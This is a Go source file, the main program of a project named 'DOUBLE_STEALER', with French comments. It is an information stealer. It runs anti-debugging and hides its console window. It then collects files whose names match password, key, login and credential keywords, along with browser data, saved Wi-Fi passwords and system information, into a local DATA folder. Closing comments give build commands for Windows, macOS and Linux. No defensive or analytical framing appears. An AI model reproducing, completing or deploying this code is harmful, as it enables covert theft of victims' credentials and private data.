package main

import (
	"DOUBLE_STEALER/antibug"
	"DOUBLE_STEALER/creation" // pour le module creation
	"DOUBLE_STEALER/getdata"  // pour le module Get_Data
	"DOUBLE_STEALER/getnav"   // pour le module Get_Nav
	"DOUBLE_STEALER/getos"    // pour le module Detection_Os
	"DOUBLE_STEALER/getwifi"  // pour le module Hide
	"DOUBLE_STEALER/hide"
	"log"
	"path/filepath"
)

func main() {
	antibug.RunAntiDebugEffect()
	// Cacher la fenêtre, à mettre avant l'exécution du programme
	hide.HideConsole()

	// Nom du dossier DATA
	dataFolder := "DATA"
	navigateursFolder := "Navigateurs"

	// Supprimer le contenu existant dans le dossier DATA
	err := creation.ClearDataFolder(dataFolder)
	if err != nil {
		log.Printf("Erreur lors de la suppression du contenu du dossier DATA : %v", err)
		return
	}

	// Créer le dossier DATA et ses sous-dossiers
	err = creation.CreateDataFolder()
	if err != nil {
		log.Printf("Erreur lors de la création du dossier DATA ou de ses sous-dossiers : %v", err)
		return
	}

	// Liste des extensions et des noms à filtrer
	extensions := []string{
		".txt", ".pdf", ".odc", ".doc", ".docx", ".xls", ".xlsx", ".rtf", ".md", ".log", "sqlite3", "sqlite", ".db", ".json", ".xml"}

	names := []string{
		"Password", "password", "Passwords", "passwords", "Pass", "pass", "MotsDePasse", "motsdepasse", "MDP", "mdp",
		"Key", "key", "Keys", "keys", "Cle", "cle", "Cles", "cles", "Code", "code", "Codes", "codes",
		"Credential", "credential", "Credentials", "credentials", "Login", "login", "Logins", "logins",
		"Access", "access", "Accès", "accès", "ID", "id", "Identifiant", "identifiant", "Identifiants", "identifiants",
		"Sécurité", "sécurité", "Security", "security", "note"}

	// Traiter les données et récupérer les historiques de navigation
	err = getdata.ProcessData(dataFolder, extensions, names)
	if err != nil {
		log.Printf("Erreur lors du traitement des données : %v", err)
		return
	}

	log.Printf("Traitement des données terminé. Les fichiers sont dans %s\n", dataFolder)

	// Traiter les données des navigateurs
	navigateursFolderPath := filepath.Join(dataFolder, navigateursFolder)
	err = getnav.ProcessNavData(navigateursFolderPath)
	if err != nil {
		log.Printf("Erreur lors du traitement des données des navigateurs : %v", err)
		return
	}

	log.Printf("Traitement des données des navigateurs terminé. Les fichiers sont dans %s\n", navigateursFolderPath)

	err = getwifi.SaveWiFiPasswords() // Utiliser = pour l'assignation

	if err != nil {
		log.Printf("Erreur lors du traitement des données Wi-Fi : %v", err)
		return
	}

	log.Printf("Les informations Wi-Fi ont été sauvegardées dans %s/wifi\n", filepath.Join(dataFolder, "wifi"))

	// Nom du fichier de sortie pour les informations système
	infoFile := filepath.Join(dataFolder, "system_info.txt")

	// Écrire les informations système dans le fichier
	err = getos.WriteSystemInfoToFile(infoFile)
	if err != nil {
		log.Printf("Erreur lors de l'écriture des informations système dans le fichier : %v", err)
		return
	}

	log.Printf("Les informations système ont été écrites dans %s\n", infoFile)
}

//go build -o monExecutable-windows.exe
//.\monExecutable-windows.exe

//go build -o monExecutable-macos
//./monExecutable-macos

//go build -o monExecutable-linux
//./monExecutable-linux
//sqlite3 database.sqlite

//Replace database.sqlite with your database file. Then, if the database is small enough, you can view the entire contents with:

//sqlite> .dump

//Or you can list the tables:

//sqlite> .tables

//Regular SQL works here as well:

//sqlite> select * from some_table;

//Pour les extentions vscode, je recommande d'utiliser: VSCode Essentials + AI Tools for Beginners / Novices
//C'est bien pour les débutant et même après car les outils proposés dedans sont polyvalents
